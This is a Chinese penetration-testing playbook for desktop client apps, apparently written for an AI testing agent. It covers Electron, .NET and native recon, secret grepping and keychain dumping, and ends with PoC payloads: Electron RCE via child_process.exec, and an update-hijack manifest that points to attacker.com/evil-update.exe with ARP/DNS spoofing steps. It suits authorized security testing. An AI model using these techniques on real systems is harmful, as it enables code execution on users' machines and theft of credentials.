# 桌面客户端渗透（Windows / Mac / Linux）

## Triggers (何时用)

- 目标提供 Windows/Mac/Linux 客户端下载
- 安装目录含 `resources/app.asar`(Electron)
- 安装目录含 `*.dll` + 可疑 .NET 程序集(C# 应用)
- 官网有"下载客户端"入口
- Web 端加密/签名死活搞不定,客户端可能有完整算法

## Coverage points (查什么)

**铁律**:
- **Electron 应用 = 半个 Web 应用** — `asar extract` 拿到完整前端源码,等同于拿到未混淆的 JS
- **客户端硬编码 > Web 前端硬编码** — 客户端开发者安全意识普遍弱于 Web 开发者
- **nodeIntegration:true + XSS = RCE** — Electron 最经典的高危组合
- **自动更新机制 = 高价值目标** — 劫持更新 = 全客户端用户 RCE

**技术栈识别**:Electron(`resources/app.asar`)/ .NET(`*.dll` + Target.exe)/ Java(`jre\` `*.jar`)/ 原生(PE/Mach-O/ELF)。可先跑 `tools/run.sh client-recon <target_dir> <asset_path> --type auto` 自动识别 + 输出 `client-attack-surface.md` + api-paths/base-urls/secrets/deep-links。

**Electron 高危配置**:`nodeIntegration` / `contextIsolation` / `webSecurity` / `allowRunningInsecureContent` / `enableRemoteModule` / preload 暴露的 API。

**自动更新**:更新 URL 是 HTTP 还是 HTTPS / 更新包是否验证签名 / latest.yml 或 RELEASES 是否可篡改。

**通信协议**:HTTP(S) 代理 / 自定义 TCP(Wireshark)/ WebSocket(DevTools WS 标签)/ gRPC(找 .proto)。

**本地安全**:配置文件/注册表/Keychain/日志里的 token/password/api_key 明文;DLL 劫持 / 未引用服务路径 / 弱权限安装目录(提权)。

抓到包后走 Web 测试全流程(`doctrine/coverage-audit.md`),客户端特有端点(版本检查/设备注册/推送注册)也要测。

## Common misses (AI 常忘)

- 拿到 Electron 不先 `asar extract` → 等同未混淆 JS 源码,密钥/路由全在里面
- nodeIntegration:true 但找不到 XSS 入口就报 → 配置危险但无入口不算可利用
- 自动更新只看有无,没看 URL 协议(HTTP 可 MitM)+ 签名验证(无签名可替换包)
- API key 在本地但是 public key(如 Stripe pk_live)→ 设计如此,客户端必须有
- DLL 劫持但需要管理员权限放置 DLL → 需要同权限 = 无提权,不算
- 开发者工具可打开但只能看到混淆代码 → 不算漏洞(DevTools 是 Electron 特性)

## Verification (verified 标准)

1. **nodeIntegration:true 但无 XSS 触发点** — 配置危险但没入口不算可利用漏洞
2. **API key 在本地但是 public key(如 Stripe pk_live)** — 设计如此,客户端必须有
3. **DLL 劫持但需要管理员权限放置 DLL** — 需要同权限 = 无提权,不算
4. **自动更新是 HTTPS + 有签名验证** — 安全的,放过
5. **开发者工具可打开但只能看到混淆代码** — 不算漏洞(DevTools 是 Electron 特性)

## Related playbooks

- 统一客户端静态提取 → `tools/client-recon.py`
- Android APK 深度提取 → `tools/android-recon.py`
- 签名/加密函数逆向 → `skills/js-reverse/crypto-sign.md` + `tools/sign-extract.py`
- Electron JS 逆向 → `skills/js-reverse/js-deep-analysis.md`
- Frida 脚本生成 → `tools/frida-template.py`
- .NET 认证漏洞 → `skills/api-logic/auth-bypass.md`
- 本地文件读取 → `skills/api-logic/ssrf-arbitrary-file.md`(思路相通)

## Reference (深度参考 — AI 可能不会的细节)

### Electron 提取 + 配置检查

```bash
cd "C:\Program Files\Target App\resources"
npx asar extract app.asar ./extracted/
# 或
npx @electron/asar extract app.asar ./extracted/

cd extracted/
grep -rniE "(api_key|apikey|secret|password|token|base_url|baseurl)" --include="*.js" --include="*.json" | grep -v node_modules
grep -rn "webPreferences" --include="*.js" -A 10
```

**Electron 高危配置检查**:

| 配置 | 危险值 | 影响 |
|---|---|---|
| `nodeIntegration` | `true` | XSS = RCE(可 `require('child_process')`) |
| `contextIsolation` | `false` | preload 脚本暴露的 API 可被页面 JS 调用 |
| `webSecurity` | `false` | 同源策略关闭,任意跨域 |
| `allowRunningInsecureContent` | `true` | HTTPS 页面可加载 HTTP 资源(MitM → 注入) |
| `enableRemoteModule` | `true`(旧版) | 渲染进程直接访问主进程模块 |

**开发者工具激活**:`Ctrl+Shift+I` / `F12` / `Ctrl+Shift+D`;命令行 `"Target.exe" --inspect=9229` / `--remote-debugging-port=9222`;检查是否禁用 `grep -rn "openDevTools\|devtools"`。

### 自动更新劫持

```bash
grep -rn "autoUpdater\|electron-updater\|update-electron-app\|Squirrel" --include="*.js" --include="*.json"
grep -rn "feedURL\|updateURL\|publish" --include="*.js" --include="*.json" --include="*.yml"
# 检查点:
# 1. 更新 URL 是 HTTP 还是 HTTPS?(HTTP = 可 MitM 注入恶意包)
# 2. 更新包是否验证签名?(无签名 = 替换任意包)
# 3. latest.yml / RELEASES 文件是否可篡改?
```

### .NET / 原生应用提取

```bash
# .NET — dnSpy / ILSpy 打开 Target.exe,搜 password/secret/connectionString/HttpClient/Cryptography
ilspycmd Target.exe > decompiled.cs
grep -n "apiKey\|secret\|password\|connectionString" decompiled.cs

# Windows PE
strings -n 8 Target.exe | grep -iE "https?://|api_key|secret|token|password|salt|iv"
7z x setup.exe -o./setup_extracted/

# macOS Mach-O
otool -L /Applications/Target.app/Contents/MacOS/Target
strings -n 8 /Applications/Target.app/Contents/MacOS/Target | grep -iE "https?://|api_key|secret|token|password"
plutil -p /Applications/Target.app/Contents/Info.plist
security find-generic-password -s "com.target.app" -a "account" -g 2>&1

# Linux
flatpak run --command=sh com.target.App   # 进入沙箱后检查 /app/extra/
strings /proc/$(pgrep TargetApp)/exe | grep -iE "https?://|secret|token"
```

### PoC 模板

```javascript
// Electron RCE(当 nodeIntegration:true 时,在 XSS 点注入)
require('child_process').exec('calc.exe')  // Windows
require('child_process').exec('id > /tmp/pwned')  // Linux/Mac

// 通过 IPC 接口(contextIsolation:false 时)
window.electronAPI.executeCommand('whoami')  // 如果 preload 暴露了命令执行
```

```bash
# 自动更新劫持 PoC(如果更新 URL 是 HTTP)
# 1. ARP 欺骗 / DNS 劫持
# 2. 返回恶意 latest.yml:
cat <<'EOF'
version: 99.0.0
files:
  - url: http://attacker.com/evil-update.exe
    sha512: <hash>
path: evil-update.exe
releaseDate: 2026-01-01
EOF
# 3. evil-update.exe 是你的 payload
```
